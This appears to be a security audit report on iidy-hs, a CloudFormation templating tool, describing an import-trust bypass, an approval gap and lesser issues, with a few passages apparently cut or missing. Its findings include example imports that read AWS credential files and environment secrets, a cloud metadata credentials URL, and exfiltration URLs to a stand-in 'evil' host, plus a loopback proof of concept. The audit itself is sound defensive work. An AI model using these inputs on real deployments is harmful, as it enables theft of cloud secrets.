Overall posture: the code is tidy, pure where it should be (the resolver and
Handlebars engine do no IO), uses no shell for git, verifies TLS by default,
and the March fixes are all still in place. The weak point is the import trust
model. The gate itself (=parseImportType=) is wired in and blocks the direct
cases, but it decides "remote or local" from a string prefix of the parent
location and fails open, and the model as designed does not stop a remote
template from reading secrets through the remote-allowed import types and
sending them out through an interpolated import URL. The template approval
feature is also weaker than its documentation suggests.

Counts by severity: High 2, Medium 3, Low 7, Info 3. No Critical findings.

Top risks:

1. A remote template can escape the local-only restriction by importing an
   S3 object with the short =s3:bucket/key= spelling; documents loaded that way
   are treated as local and may use =file:=, =env:=, =git:=, =filehash:=.
2. A remote template can read SSM SecureStrings, CloudFormation outputs, the
   importing template's own variables and loopback/link-local HTTP endpoints,
   and exfiltrate them in the URL of a nested =http(s):= import.
3. =ApprovedTemplateLocation= is never consulted by create/update/changeset, so
   the approval workflow does not gate deployments by itself.

What I could not check:

- No real AWS calls were made. Everything on the S3/SSM/CFN paths is confirmed

- No network, so dependency advisories are from memory (knowledge cutoff
  mid-2026) and not from a current advisory database query. No =cabal audit= /
  =osv= run.
- Terminal-escape effects were not demonstrated on a live terminal.
- The PLT Redex spec, the test suite, benchmarks and CI config were not
  reviewed. The Nix closure (system libraries such as OpenSSL/zlib/gmp) was
  not audited.

** High: import trust gate fails open for any parent location not spelled =s3://=, =http://= or =https://=
:PROPERTIES:
:ID: org:01a1e68e-1585-707c-91d5-94cf1de05539
:ADDED: [2026-11-16 Mon 15:50]
:END:

- Severity :: High
- Status :: CONFIRMED (gate behaviour evaluated; S3 fetch path read from code, not run against AWS)
- Location :: =src/Iidy/Yaml/Imports/Types.hs:81=, =:122= (=isRemoteBase=);
  =src/Iidy/Yaml/Imports/Loaders/S3.hs:38=, =:66=, =:127=;
  =src/Iidy/Yaml/Engine.hs:199= (child base = =idLocation=)
- Failure scenario :: A local stack-args or =render:= template imports
  =https://partner.example/base.yaml= (attacker-controlled or MITM'd). That
  document is correctly treated as remote. It then declares
  =$imports: {b: "s3:attacker-bucket/b.yaml"}=. =s3:= is allowed from remote
  templates, and the S3 loader accepts the short form (it strips =s3:= and an
  optional =//=). The loaded document's base location is recorded verbatim as
  =s3:attacker-bucket/b.yaml=, which does not start with =s3://=, so
  =isRemoteBase= says "local". =b.yaml= may now use
  =file:/home/user/.aws/credentials=, =env:AWS_SECRET_ACCESS_KEY=, =git:=,
  =filehash:=, and can ship the values out through a further
  =https://evil/{{urlEncode x}}= import (see next finding). The same
  fail-open applies to documents loaded via =ssm:...:yaml= and =cfn:= (their
  base locations are =ssm:...= / =cfn:...=), although those need content
  planted in the victim's account. Requires an AWS env, so it applies to the
  deploy commands (stack-args and =render:= templates), not to bare
  =iidy render= (which passes no AWS env).
- Evidence ::
  #+begin_src haskell
  -- Types.hs
  isRemoteBase loc =
      T.isPrefixOf "s3://" loc || T.isPrefixOf "http://" loc || T.isPrefixOf "https://" loc
  -- S3.hs
  let uri = fromMaybe location (T.stripPrefix "s3:" location)   -- :38
  let withoutSlashes = fromMaybe uri (T.stripPrefix "//" uri)    -- :127, "bucket/key" accepted
  , idLocation = location                                        -- :66, becomes the child's base
  #+end_src
  Gate evaluated with =ghc -e= on =Iidy.Yaml.Imports.Types=:
  #+begin_example
  parseImportType "file:/etc/passwd" "s3://bucket/evil.yaml"        => Left "Import type file is not allowed from remote templates"
  parseImportType "s3:bucket/evil.yaml" "https://example.com/a.yaml" => Right ImportS3
  parseImportType "file:/etc/passwd" "s3:bucket/evil.yaml"          => Right ImportFile
  parseImportType "env:AWS_SECRET_ACCESS_KEY" "s3:bucket/evil.yaml" => Right ImportEnv
  parseImportType "env:HOME" "ssm:/some/param:yaml"                 => Right ImportEnv
  #+end_example
- Recommendation :: Stop deriving trust from a string prefix. Carry an explicit
  trust flag (or the parent's =ImportType=) through =processImportedDoc=: a
  document is local only if it was loaded by =ImportFile= from a local parent;
  everything else (S3, HTTP, SSM, CFN) is remote, and "remote" is sticky down
  the import chain. Independently, normalise S3 locations to =s3://bucket/key=
  (or reject the short form) and make =isRemoteBase= an allowlist of local
  forms instead of a denylist of remote ones. Add regression tests for
  =s3:bucket/key=, =ssm:=, =cfn:= parents.

** High: remote templates can read secrets and exfiltrate them through interpolated import URLs
:PROPERTIES:
:ID: org:01a1e68e-1585-707c-91d5-94ce6b11308a
:ADDED: [2026-11-16 Mon 15:50]
:END:

- Severity :: High
- Status :: CONFIRMED for parent-variable leak and loopback fetch (reproduced);
  CONFIRMED from code for =ssm:= / =cfn:= sources (no AWS run)
- Location :: =src/Iidy/Yaml/Engine.hs:170= (location interpolation),
  =:199= and =:233= (imported document inherits the parent's =env=);
  =src/Iidy/Yaml/Imports/Loaders/Dispatch.hs:70-77= (=http=, =ssm=, =ssm-path=,
  =cfn=, =s3= allowed from remote); =src/Iidy/Yaml/Imports/Loaders/Ssm.hs=
  (=withDecryption = True=); =SECURITY.md= "What This Protects Against"
- Failure scenario :: SECURITY.md says remote templates cannot steal
  credentials or reach local resources. In practice a remote document has
  three sources of sensitive data and one outbound channel:
  1. /Parent variables./ The imported document is preprocessed with the
     importing template's full environment (all =$defs= and every import
     loaded before it). If the local template did =$imports: {dbPass:
     "ssm:/prod/db/password", shared: "https://partner.example/shared.yaml"}=,
     =shared.yaml= can reference =dbPass=.
  2. /AWS data./ The remote document may itself import
     =ssm:/any/parameter= (decrypted SecureStrings), =ssm-path:/= (the whole
     parameter tree the caller can read), and =cfn:stack:...= with the
     deployer's credentials.
  3. /Internal HTTP./ It may import =http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>=
     (IMDSv1 on EC2/CI runners), =http://localhost:...= admin endpoints, etc.
     Redirects are followed, so an allowed-looking URL can also bounce there.
  The channel: import locations are Handlebars-interpolated, so
  =$imports: {x: "https://evil.example/{{urlEncode dbPass}}.yaml"}= sends the
  value to the attacker. Nothing is printed locally; the import record is not
  shown.
- Evidence :: Reproduced with a loopback server standing in for the remote host.
  #+begin_src yaml
  # local/parent.yaml
  $defs:
    secret: hunter2
  $imports:
    r: "http://127.0.0.1:18473/evil.yaml"
  out: !$ r
  # www/evil.yaml (served remotely)
  $imports:
    x: "http://127.0.0.1:18473/leak/{{secret}}.yaml"
  got: !$ secret
  #+end_src
  #+begin_example
  $ iidy-hs render local/parent.yaml
  out:
    got: hunter2
  server log:
  REQ /evil.yaml
  REQ /leak/hunter2.yaml
  #+end_example
  The same run shows a remote document fetching a loopback URL. Direct
  =file:= / =env:= / bare relative imports from =evil-*.yaml= were correctly
  rejected ("Import type file is not allowed from remote templates"), and an
  HTTP redirect to =file:///etc/hostname= was refused (surfaced as "HTTP error
  302").
- Recommendation :: Decide what the trust model is meant to guarantee and
  enforce it at the data-flow level:
  - Do not pass the parent's environment into remote documents (or pass only
    an explicit allowlist); resolve them in an empty environment.
  - For remote documents, either forbid =ssm:=, =ssm-path:=, =cfn:= outright
    (opt-in flag), or forbid Handlebars interpolation in import locations of
    remote documents so that fetched values cannot reach a URL.
  - Block loopback, link-local (=169.254.0.0/16=, =fd00:ec2::254=) and
    private-range targets for =http(s):= imports requested by remote
    documents, re-checking after each redirect (or disable redirects and
    follow them manually).
  - Update SECURITY.md: today it lists =ssm:= / =cfn:= under "What This
    Allows" without stating the exfiltration consequence.

- Failure scenario :: A team sets =ApprovedTemplateLocation: s3://approved/…=
  in stack-args and relies on the README statement that templates need
  approval before deployment. A developer edits the template and runs
  =iidy-hs update-stack stack-args.yaml=. The tool sends the local, unapproved
  template body straight to CloudFormation. In iidy-js the deploy commands
  swap the template for the hashed S3 object under the approved location, so
  an unapproved template fails to deploy; here (and in the Rust port, which
  has the same gap) approval is advisory unless an IAM policy separately
  restricts =cloudformation:TemplateUrl=. If such a policy exists the effect
  flips: every deploy fails because a =TemplateBody= is sent.

  =latest= the tool reports =approved: true= with the approved location but
  never writes the approved object (=arCleanupCompleted = False=), so the
  status output is wrong.

  loader, the type, GlobalConfig and the approval-request command.
  =buildCreateStackInput= / update / changeset call
  =loadCfnTemplate (saTemplate args) …= and never look at the approved
  location.
- Recommendation :: In the request builders, when =ApprovedTemplateLocation=
  is set, compute the versioned key (=generateVersionedLocation=), require the
  object to exist, and pass it as =TemplateURL=; fail with a pointer to
  =template-approval request= otherwise. Fix the no-diff review path to copy
  the pending object to the approved key (or report "not approved"). Record
  the divergence from iidy-js in DIVERGENCES.md until fixed.

  audit trail does not show where content came from. The manifest with
  SHA-256 digests is computed but never displayed or checked.
- Recommendation :: Require =https:= unless a flag allows =http:=; set
  =redirectCount = 0= or re-validate each hop; record the final URL; consider
  optional digest pinning (=https://…#sha256=…=) using the digest already
  computed for the manifest.

** 1. Import trust boundary
:PROPERTIES:
:ID: org:01a1e68e-1584-74b8-b152-a9481688fe51
:ADDED: [2026-11-16 Mon 15:50]
:END:
Read =Imports/Types.hs=, all loaders, =Dispatch.hs=, =Engine.hs=,
=Manifest.hs=, =ContentParsing.hs=, =TemplateLoader.hs=, =Render.hs=,
=GetImport.hs=, =StackArgsLoader.hs=. Ran a loopback server with hostile
documents. Clean: direct =file:= / =env:= / =git:= / =filehash:= and bare
relative or =./= / =../= / =/= paths from an =http://= parent are rejected;
unknown prefixes and upper-case schemes are rejected; redirect to =file://=
is refused by http-client; the resolver (=!$=, =!$include=, =!$parseYaml=,
=!$parseJson=, =$defs=) is pure and cannot reach files or env; TLS uses the
default verifying manager; a 10 MB streaming cap exists for HTTP and S3.
Not clean: fail-open base classification (High), exfiltration through
remote-allowed types and inherited environment (High), no depth/alias limits
and header-only timeout (Low), plaintext http and redirects (Low). Top-level
templates are always local files (=render= and =render:= read from disk), so
"remote" only arises through imports. Local file imports follow symlinks and
=..= freely, which is consistent with local templates being trusted.

** 2. Secret handling
:PROPERTIES:
:ID: org:01a1e68e-1584-74b8-b152-a947c884e6e1
:ADDED: [2026-11-16 Mon 15:50]
:END:
SSM values are fetched with decryption and flow into the rendered
output/parameters by design. No temp files are written for secrets; =--debug=
is inert; amazonka logging is not enabled. Leak found: session token in
=show=-formatted transport errors (Low). Preprocess errors for stack-args are
printed with =show=, which includes import locations and paths but, from what
I read, not imported values. =param get= prints values only on request and
=--decrypt= is opt-in; =param set= defaults to SecureString. Secrets passed
on the command line (=param set <value>=) are visible in the process list,
as with any CLI.

** 3. AWS credentials, profile, region, assume-role, approval

** 5. YAML parsing hazards
:PROPERTIES:
:ID: org:01a1e68e-1584-74b8-b152-a944ae51a596
:ADDED: [2026-11-16 Mon 15:50]
:END:
HsYAML with a custom loader; unknown tags do not instantiate anything, and
=!$parseYaml= / =!$parseJson= go through the same data-only parser
(=astToValueRaw=), so there is no string-to-code path. Aliases are shared
nodes with no expansion limit (Low, reproduced). Huge exponents
(=1e1000000000=) rendered without blow-up. JMESPath (=--query=) is a local
pure evaluator over the rendered document with a CLI-supplied query; not a
remote input. Handlebars helpers are pure string functions; =pad= is
unbounded. Regex validation uses regex-tdfa (no backtracking) with a length
cap.

** 6. File writes
:PROPERTIES:
:ID: org:01a1e68e-1584-74b8-b152-a943abb3f993
:ADDED: [2026-11-16 Mon 15:50]
:END:
=render --outfile= refuses to overwrite without =--overwrite= (check then
write, small race, low value). =init-stack-args= refuses without =--force=.
=convert-stack-to-iidy= overwrites without asking and also overwrites SSM
parameters (Low). =demo= writes under a predictable shared path (Low); its
script file paths are checked for absolute paths and =..=. All files use the
default umask.
